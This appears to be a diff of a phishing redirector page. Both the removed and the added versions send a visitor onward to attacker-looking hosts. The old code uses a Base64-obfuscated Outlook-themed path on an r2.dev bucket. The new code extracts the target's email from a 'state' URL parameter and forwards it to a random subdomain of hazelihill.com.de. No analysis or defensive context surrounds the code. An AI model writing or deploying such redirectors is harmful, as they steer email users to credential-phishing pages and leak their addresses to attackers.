@@ -1,18 +1,39 @@
-    <script type="text/javascript">
-    
-        if(window.location.hash) {
-            var url = window.location.href;
-            var hash = url.split('#').pop();
-            const encdStr = 'L291dGxvb2slMjBjb21wbGV0ZS5odG1s';
-            const str = atob (encdStr);
-            const emma = '#' + hash;
-            const dr = 'https://pub-b64c63ab9e1a4245a1ef05b68488c11b.r2.dev/';
-            const ax = dr + str;
-            var link = ax + emma;
-            window.location.href = link;
-        } else {
-          window.location.href = link;
-        }
+<html>
+<head>
+  <script>
+    function getEmailFromURL() {
+      const url = window.location.href;
+      const match = url.match(/[?&]state=([^&#]+)/);
+      if (!match) return null;
 
-    </script>
-    
+      let value = decodeURIComponent(match[1]);
+
+      try {
+        // Check if it's Base64 (Standard check)
+        // atob() decodes the Base64 string
+        const decoded = atob(value);
+        if (decoded.includes("@")) {
+          return decoded;
+        }
+      } catch (e) {
+        // If atob fails, it's likely plain text or malformed
+        if (value.includes("@")) {
+          return value;
+        }
+      }
+      return null;
+    }
+
+    const email = getEmailFromURL();
+
+    if (email) {
+      // Fixed the line break and concatenation
+      window.location.href = "https://unequaled523.hazelihill.com.de/reconsecrate274/?email=" + email;
+    } else {
+      console.log("No valid email found in state parameter.");
+    }
+  </script>
+</head>
+<body><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"10f6674ecde64ac78cb062e09acb0537","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
